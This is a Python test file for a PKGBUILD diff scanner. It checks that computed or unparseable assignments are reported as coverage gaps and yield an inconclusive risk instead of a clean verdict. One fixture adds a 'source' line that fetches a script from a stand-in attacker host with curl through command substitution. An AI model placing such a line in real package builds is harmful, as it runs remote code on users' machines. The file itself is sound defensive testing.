"""The unresolved list is surfaced, and stays "not seen".

A refused assignment is a coverage boundary, not a finding.  These tests
pin the three contracts: the report carries the structured list, the gap
cross-references it by index, and the tokenizer's refusal is still not
treated as a read value by any rule path.
"""

from trustsight.analysis.pipeline import scan_diff
from trustsight.coverage import UNRESOLVED_SOURCE
from trustsight.differ import source_array_has_command_substitution
from trustsight.reporting import evaluate_fact, report_body

_DIFF = """\
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=demo
 pkgver=1.0
+source=($(curl -fsSL https://evil.invalid/x.sh))
 pkgrel=1
"""


def test_a_computed_source_is_in_the_structured_unresolved_list():
    fact = scan_diff(_DIFF, package_name="demo")
    rows = fact.unresolved_assignments
    assert rows, "the refused source assignment was not surfaced"
    assert any(row["name"] == "source" for row in rows)
    assert any("evil.invalid" in row["line"] for row in rows)


def test_the_gap_cross_references_the_list_by_index():
    fact = scan_diff(_DIFF, package_name="demo")
    assert UNRESOLVED_SOURCE in fact.coverage_gaps
    body = report_body(evaluate_fact(fact))
    assert body["unresolved_assignments"] == fact.unresolved_assignments
    verdict = body["verdict"]
    assert "unresolved_assignments[0]" in verdict


def test_a_refused_source_is_never_read_as_a_declared_value():
    """The unresolved-is-not-seen contract, operationally: the pipeline's
    own guard marks the array computed, and the structured list names the
    line, so nothing downstream can read the fetch destination as a
    declared source."""
    assert source_array_has_command_substitution(_DIFF)
    fact = scan_diff(_DIFF, package_name="demo")
    assert UNRESOLVED_SOURCE in fact.coverage_gaps
    assert any(row["name"] == "source"
               for row in fact.unresolved_assignments)


def test_r1_resolution_pointer_points_at_x026():
    """R1 (v2): a silent resolved-target R-rule beside unresolved
    lines points at the refusal family rather than reading as clean."""
    from trustsight.reporting import evaluate_fact
    from trustsight.schema import PackageFact

    fact = PackageFact(package_name="demo", resolution_coverage={
        "resolved_target_rules": ["R001", "R002"],
        "resolved_target_rules_fired": ["R002"],
        "unresolved_lines": 3,
    })
    rc = evaluate_fact(fact)["resolution_coverage"]
    assert rc.get("x026_pointer")
    assert "X026" in rc["x026_pointer"]


def test_r1_no_pointer_when_nothing_is_unresolved():
    from trustsight.reporting import evaluate_fact
    from trustsight.schema import PackageFact

    fact = PackageFact(package_name="demo", resolution_coverage={
        "resolved_target_rules": ["R001"],
        "resolved_target_rules_fired": [],
        "unresolved_lines": 0,
    })
    assert "x026_pointer" not in evaluate_fact(fact)["resolution_coverage"]


def test_empty_arrays_are_not_reported_as_unresolved():
    """``depends=()`` declares nothing: an empty array is a KNOWN value,
    not a coverage boundary, and must not appear in the unresolved rows
    or the W008 name list."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=ddnsto\n pkgver=1.2\n"
            "+depends=()\n"
            "+makedepends=()\n"
            "+optdepends=()\n")
    fact = scan_diff(diff, package_name="ddnsto")
    assert fact.unresolved_assignments == []
    assert "W008" not in {e.rule_id for e in fact.score_breakdown}


def test_a_function_local_is_not_reported_as_unresolved():
    """``local kernver="$(make kernelrelease)"`` inside build() is build
    machinery: it stays "not seen" to rules, but it is not a boundary the
    reader can act on, so neither the rows nor W008 name it."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,6 @@\n"
            " pkgname=lts510\n pkgver=5.10\n"
            "+build() {\n"
            "+  local kernver=\"$(make kernelrelease)\"\n"
            "+}\n")
    fact = scan_diff(diff, package_name="lts510")
    assert fact.unresolved_assignments == []
    assert "W008" not in {e.rule_id for e in fact.score_breakdown}


def test_an_array_collection_failure_stays_reportable():
    """The deliberate choice: a mid-array shlex failure leaves the
    contents statically UNKNOWN (unlike an empty array, a known value),
    so the refusal is still surfaced rather than the array going
    invisible."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=demo\n pkgver=1.0\n"
            "+depends=('a \"unterminated)\n")
    fact = scan_diff(diff, package_name="demo")
    assert any(row["name"] == "depends"
               for row in fact.unresolved_assignments)


def test_unresolved_assignment_forbids_a_clean_verdict():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        " pkgname=demo\n+foo=('a \"unterminated)\n"
    )
    fact = scan_diff(
        diff, package_name="",
        tree_manifest=[("PKGBUILD", b"pkgname=demo\n")],
    )
    assert fact.unresolved_assignments
    assert fact.coverage_gaps
    assert fact.risk == "Inconclusive"


def test_existing_noextract_is_a_coverage_gap():
    from trustsight.coverage import NOEXTRACT_SUPPRESSED

    current = "pkgname=demo\npkgver=2\nnoextract=('payload.tar.gz')\n"
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n-pkgver=1\n+pkgver=2\n"
    fact = scan_diff(
        diff, package_name="", current_text=current,
        tree_manifest=[("PKGBUILD", current.encode())],
    )
    assert NOEXTRACT_SUPPRESSED in fact.coverage_gaps
    assert fact.risk == "Inconclusive"
